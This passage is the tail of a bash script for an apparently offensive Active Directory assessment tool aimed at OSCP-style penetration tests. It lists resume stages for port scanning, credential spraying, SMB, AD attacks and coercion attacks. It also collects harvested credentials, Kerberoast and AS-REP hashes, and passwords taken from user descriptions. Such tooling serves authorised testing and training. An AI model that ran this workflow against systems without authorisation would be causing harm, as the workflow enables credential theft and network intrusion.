echo -e "    ${GRAY}--resume 0${NC}  Port scanning"
echo -e "    ${GRAY}--resume 2${NC}  Credential spraying"
echo -e "    ${GRAY}--resume 3${NC}  SMB shares"
echo -e "    ${GRAY}--resume 7${NC}  AD attacks"
echo -e "    ${GRAY}--resume 8${NC}  Slow operations (spider, enum4linux, vulns)"

[[ "$OSCP_MODE" == true ]] && \
    echo -e "${GRAY}[*] OSCP mode: petitpotam / coerce_plus were not executed${NC}"

echo -e "\n${YELLOW}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║  STARTUP COMMAND (copy for notes):                        ║${NC}"
echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════╝${NC}"
echo -e "${WHITE}$STARTUP_CMD${NC}"
echo ""

# ── Copy key files to CWD ─────────────────────────────────────────────────────
echo -e "${CYAN}[*] Copying key files to current directory...${NC}"
_cwd_copied=()

_copy_to_cwd() {
    local src="$1" dst_name="$2"
    [[ -s "$src" ]] && cp "$src" "./$dst_name" 2>/dev/null && _cwd_copied+=("$dst_name")
}

_copy_to_cwd "$OUTDIR/confirmed_users.txt"     "confirmed_users.txt"
_copy_to_cwd "$OUTDIR/all_users_clean.txt"     "all_users_clean.txt"
_copy_to_cwd "$OUTDIR/all_users_full.txt"      "all_users_full.txt"
_copy_to_cwd "$OUTDIR/users_found.txt"         "users_found.txt"
_copy_to_cwd "$OUTDIR/found_creds.txt"         "found_creds.txt"
_copy_to_cwd "$OUTDIR/kerberoast.txt"          "kerberoast.txt"
_copy_to_cwd "$OUTDIR/asrep_all.txt"           "asrep_all.txt"
_copy_to_cwd "$OUTDIR/user_descriptions.txt"   "user_descriptions.txt"
_copy_to_cwd "$OUTDIR/passwords_from_desc.txt" "passwords_from_desc.txt"

if [[ ${#_cwd_copied[@]} -gt 0 ]]; then
    echo -e "${GREEN}[+] Copied to CWD:${NC}"
    for f in "${_cwd_copied[@]}"; do
        lc=$(wc -l < "./$f" 2>/dev/null || echo "?")
        echo -e "    ${WHITE}./$f${NC}  ($lc lines)"
    done
    if [[ "$STANDALONE" == true ]]; then
        echo -e "${YELLOW}    Tip: use confirmed_users.txt as -U input for further credential spraying${NC}"
    else
        echo -e "${YELLOW}    Tip: confirmed_users.txt = original-case AD users — use as -U input${NC}"
    fi
else
    echo -e "${GRAY}[○] No key files to copy (no users or credentials found yet)${NC}"
fi
echo ""
